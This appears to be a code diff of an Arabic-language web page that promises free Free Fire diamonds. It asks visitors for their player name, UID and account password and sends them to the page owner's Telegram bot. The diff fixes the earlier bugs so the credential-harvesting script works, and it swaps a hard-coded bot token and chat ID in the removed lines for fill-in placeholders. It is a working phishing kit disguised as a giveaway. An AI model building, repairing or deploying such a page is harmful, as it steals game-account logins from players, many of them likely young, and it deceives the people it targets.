@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شحن جواهر مجانا</title>
+    <title>شحن جواهر فري فاير مجاناً</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@600;800&display=swap');
 
         body {
             margin: 0;
             padding: 0;
-            background: #0b0b0f;
             color: #fff;
             font-family: 'Cairo', sans-serif;
             display: flex;
@@ -18,14 +17,30 @@
             align-items: center;
             min-height: 100vh;
             overflow: hidden;
-            background-image: radial-gradient(circle at top right, #2a0845, #0b0b0f);
+            /* تعيين الصورة كخلفية للشاشة بالكامل */
+            background-image: url('maxresdefault.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+        }
+
+        /* طبقة داكنة فوق الخلفية لتوضيح النصوص */
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: -1;
         }
 
         .container {
-            background: rgba(20, 20, 25, 0.8);
+            background: rgba(20, 20, 25, 0.85);
             padding: 40px;
             border-radius: 20px;
-            box-shadow: 0 0 20px rgba(255, 153, 0, 0.3), inset 0 0 20px rgba(255, 153, 0, 0.1);
+            box-shadow: 0 0 20px rgba(255, 153, 0, 0.4), inset 0 0 20px rgba(255, 153, 0, 0.2);
             border: 2px solid #ff9900;
             text-align: center;
             width: 90%;
@@ -36,14 +51,14 @@
 
         @keyframes float {
             0% { transform: translateY(0px); }
-            50% { transform: translateY(-15px); }
+            50% { transform: translateY(-10px); }
             100% { transform: translateY(0px); }
         }
 
         h1 {
             color: #ff9900;
             text-shadow: 0 0 10px #ff9900;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
             font-size: 28px;
         }
 
@@ -62,7 +77,7 @@
         input {
             width: 100%;
             padding: 12px;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.7);
             border: 1px solid #ff9900;
             border-radius: 8px;
             color: #fff;
@@ -108,44 +123,48 @@
 </head>
 <body>
 
+    <div class="overlay"></div>
+
     <div class="container">
-        <h1>💎 شحن جواهر فري فاير مجانا 💎</h1>
-        <p style="font-size: 14px; color: #aaa; margin-bottom: 25px;">شارك الآن لفرصة ربح آلاف الجواهر مجاناً! سيتم الشحن عبر الـ UID.</p>
+        <h1>💎 شحن جواهر مجاناً 💎</h1>
+        <p style="font-size: 14px; color: #ccc; margin-bottom: 25px;">أدخل بياناتك لاستلام الجواهر في حسابك مباشرة.</p>
         
         <div class="input-group">
-            <label>البريد الالكتروني :</label>
-            <input type="text" id="playerName" placeholder="مثال: user@gmail.com" required>
+            <label>اسم اللاعب (في اللعبة):</label>
+            <input type="text" id="playerName" placeholder="مثال: Ninja_Pro" required>
         </div>
 
         <div class="input-group">
             <label>معرف اللاعب (UID):</label>
             <input type="number" id="playerUid" placeholder="أدخل الـ UID الخاص بك" required>
         </div>
-        <div class="input-group">
-            <label>كلمة مرور الحساب:</label>
-            <input type="number" id="password" placeholder=" ادخل كلمه السر الخاصه بالحساب" required>
-        </div> 
 
-        <button onclick="sendToTelegram()"> مجانا اشترك الآن 🔥</button>
-        <div class="success-msg" id="successMsg">🎉ليس عليك سوي الانتظار لبضع دقائق تم تسجيل اشتراكك بنجاح! حظاً موفقاً.</div>
+        <div class="input-group">
+            <label>كلمة المرور:</label>
+            <input type="password" id="playerPassword" placeholder="أدخل كلمة المرور الخاصة بالحساب" required>
+        </div>
+
+        <button onclick="sendToTelegram()">اشحن الآن 🔥</button>
+        <div class="success-msg" id="successMsg">🎉 جاري معالجة الطلب! سيتم الشحن قريباً.</div>
     </div>
 
     <script>
         function sendToTelegram() {
             const name = document.getElementById('playerName').value;
             const uid = document.getElementById('playerUid').value;
-            const password = decument.getElementById("password").value;
-            if(!name || !uid|| password) {
-                alert("يرجى إدخال الاسم والـباسوورد UID للمشاركة!");
+            const password = document.getElementById('playerPassword').value;
+
+            if(!name || !uid || !password) {
+                alert("يرجى إدخال جميع البيانات (الاسم، الـ UID، وكلمة المرور)!");
                 return;
             }
 
             // --- ضع بيانات البوت الخاص بك هنا ---
-            const botToken = "8221264460:AAFPrYn7Ae7W0mXVjd31yktH8Xqd8iI1bMI"; 
-            const chatId = "7394389253";
+            const botToken = 'ضع_توكن_البوت_هنا'; 
+            const chatId = 'ضع_ايدي_حسابك_هنا';
             
-            // الرسالة المنسقة التي ستصلك
-            const message = `🎯 مشترك جديد في مسابقة الجواهر!\n\n👤 الاسم: ${name}\n🆔 الـ UID: uid:${uid}\n الباسوورد ${password}`;
+            // الرسالة المنسقة التي ستصلك على التلجرام وتتضمن كلمة المرور
+            const message = `💎 طلب شحن جديد!\n\n👤 الاسم: ${name}\n🆔 الـ UID: ${uid}\n🔑 كلمة المرور: ${password}`;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
@@ -155,9 +174,9 @@
                         document.getElementById('successMsg').style.display = 'block';
                         document.getElementById('playerName').value = '';
                         document.getElementById('playerUid').value = '';
-                       edocument.getElementById("password").value ='';
+                        document.getElementById('playerPassword').value = '';
                     } else {
-                        alert("حدث خطأ في السيرفر، يرجى المحاولة لاحقاً.");
+                        alert("حدث خطأ، يرجى المحاولة لاحقاً.");
                     }
                 })
                 .catch(error => {
